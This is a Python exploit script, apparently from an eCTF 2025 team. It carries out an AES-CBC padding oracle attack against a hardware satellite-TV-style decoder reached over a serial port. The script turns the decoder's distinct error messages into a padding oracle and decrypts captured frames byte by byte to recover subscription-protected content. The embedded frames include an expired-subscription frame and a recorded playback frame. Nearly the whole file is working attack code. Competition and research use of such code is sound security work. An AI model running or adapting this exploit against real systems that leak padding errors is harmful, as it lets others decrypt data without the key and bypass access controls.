"""AES CBC PADDING ORACLE ATTACK FOR UCF - expired sub, no sub, recording_playback
@author: Xinyue
@description: AES CBC EXPLOIT -> recover original frame
"""
from Crypto.Cipher import AES  # requires PyCryptodome
from Crypto.Util.Padding import pad, unpad
import time
import sys

# The ectf25 module comes pre-installed in the environment
from ectf25.utils.decoder import DecoderIntf

BLOCK_SIZE = 16


def single_block_attack(block,id):
    """Returns the decryption of the given ciphertext block"""

    # zeroing_iv starts out nulled. each iteration of the main loop will add
    # one byte to it, working from right to left, until it is fully populated,
    # at which point it contains the result of DEC(ct_block)
    zeroing_iv = [0] * BLOCK_SIZE

    for pad_val in range(1, BLOCK_SIZE+1):
        padding_iv = [pad_val ^ b for b in zeroing_iv]

        for candidate in range(256):
            padding_iv[-pad_val] = candidate
            iv = bytes(padding_iv)
            if oracle(iv, block,id):
                if pad_val == 1:
                    # make sure the padding really is of length 1 by changing
                    # the penultimate block and querying the oracle again
                    padding_iv[-2] ^= 1
                    iv = bytes(padding_iv)
                    if not oracle(iv, block,id):
                        continue  # false positive; keep searching
                break
        else:
            raise Exception("no valid padding byte found (is the oracle working correctly?)")

        zeroing_iv[-pad_val] = candidate ^ pad_val

        # Show progress for this byte
        recovered_byte = zeroing_iv[-pad_val]
        bit_str = format(recovered_byte, '08b')
        print(f"[+] Recovered byte at offset -{pad_val:2}: 0x{recovered_byte:02x} | Bits: {bit_str}", flush=True)
        time.sleep(1)

    return zeroing_iv


def full_attack(iv, ct,id):
    """Given the iv, ciphertext, and a padding oracle, finds and returns the plaintext"""
    assert len(iv) == BLOCK_SIZE 
    assert len(ct) % BLOCK_SIZE == 0

    msg = iv + ct
    blocks = [msg[i:i+BLOCK_SIZE] for i in range(0, len(msg), BLOCK_SIZE)]
    result = b''

    # loop over pairs of consecutive blocks performing CBC decryption on them
    iv = blocks[0]
    for ct in blocks[1:]:
        dec = single_block_attack(ct,id)
        pt = bytes(iv_byte ^ dec_byte for iv_byte, dec_byte in zip(iv, dec))
        result += pt
        iv = ct

    return result

def lgmt_channel(ct) -> bytes:
    lgmt_frame_channel1 = bytes(ct)
    return lgmt_frame_channel1

def oracle(iv: bytes, ct: bytes,id:bytes) -> bool:
    try:
        payload = id+iv+ct
        result = interface.decode(lgmt_channel(payload))
        if "Cryptographic failure." in result:
            return False
        elif "Invalid timestamp" in result:
            return True
        elif "Receiving unsubscribed" in result:
            return True
        else:
            raise ValueError(f"Unexpected error message: {result}")
    except Exception as e:
        # Optionally, include this if decode raises the error directly
        if "Cryptographic failure." in str(e):
            return False
        elif "Invalid timestamp" in str(e):
            return True
        elif "Receiving unsubscribed" in str(e):
            return True
        else:
            raise ValueError(f"Unexpected exception message: {e}")



if __name__ == '__main__':
    print("Running aes cbc attack")
    time.sleep(1)
    
    # The serial port string will be in argv[1]
    interface = DecoderIntf("/dev/tty.usbmodem14102")
    # frame_expired = b"\x02\x00\x00\x00\x04\xees\xe8\x07\xc2\xea|\xe9\xdfal3\x84?]\xffW\xcfO\xa1\xa3K\xfa\x98\xac2\xaa\x05#{\xd3\xe2A\xae\xa3\xa765\x9e\x08\xc5-\x04\x87\x1a\x0e\xda\x90\x07\x11?P#\xb0!\xcdC\xac^\x083\xd1\xed)m\xe0\x1e<en\xf3fG\xa9\xf2?D\xceO\xf1\x9b\x1dAK`q\xc0*\xaf\xc0{\x0b\xbeFy"
    # frame_nosub = b"\x04\x00\x00\x00\xf6K\xd4Q\\8\xa0\x1dmL\xc1M\xb5u-\xb9\xda\xac_K\x95\xd6\x00q\xf8s\xa9H{\xd4\xa6\xfb\xbfs\xfb~\xc8\x96\x1b$~\t\\\x89\xb1\x9cR\xfc\x19\x13(\x18)\x1c\xe5\xdb\xae\xcdXv\x12[\xba\xcd\xacRmfV\xc8\x15\x05\xe1\x97,\t\x9b\x18\xff]o\x10Z=\x0f\x01+\xfd\xf2Af\xf86\xd7p["
    recording_playback = "01000000db6f13e2a9e444a89f96b95da9cf2c8792f0ad3d7c6a8c914080ce5c71eeffd02d638ba0aa0389846080e59feb1b98886845202fa060559849b860b615061442a1ce61b1f0da753125fa470b5b17b75cdcbbf326abec1f8ca124f517ab8cb4af"
    frame = bytes.fromhex(recording_playback)
    print(frame)

    iv = frame[4:20]
    ct = frame[20:]
    id = frame[0:4]
    print(full_attack(iv,ct,id))

    print("Done with cbc attack")